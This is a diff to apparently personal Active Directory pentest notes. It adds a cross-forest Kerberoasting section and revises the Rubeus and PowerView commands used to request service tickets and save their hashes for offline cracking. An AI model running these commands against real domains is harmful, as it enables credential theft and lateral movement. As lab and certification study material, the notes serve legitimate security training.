@@ -13,6 +13,7 @@
   * [Trust tickets](#Trust-tickets)
   * [Krbtgt hash](#Krbtgt-hash)
 * [Crossforest attacks](#Crossforest-attacks)
+  * [Kerberoast](#Kerberoast2)
   * [Trust flow](#Trust-flow) 
   * [Trust abuse SQL](#Trust-abuse-SQL) 
 
@@ -39,11 +40,11 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 ```
 
 ```
-Request-SPNTicket "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+Request-SPNTicket "<SPN>"
 ```
 
 ```
-Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple
+Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain:<FQDN DOMAIN> /outfile:kerberoast_hashes.txt
 Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
 ```
 
@@ -355,6 +356,15 @@ Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select 
 ```
 
 ## Crossforest attacks
+### Kerberoast2
+#### Enumerate users with SPN cross-forest
+```
+Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName} 
+```
+
+#### Request and crack TGS see:
+See [Kerberoast](#Kerberoast) 
+
 ### Trust flow
 #### Dump trust keys
 Look for in trust key from child to parent (first command)
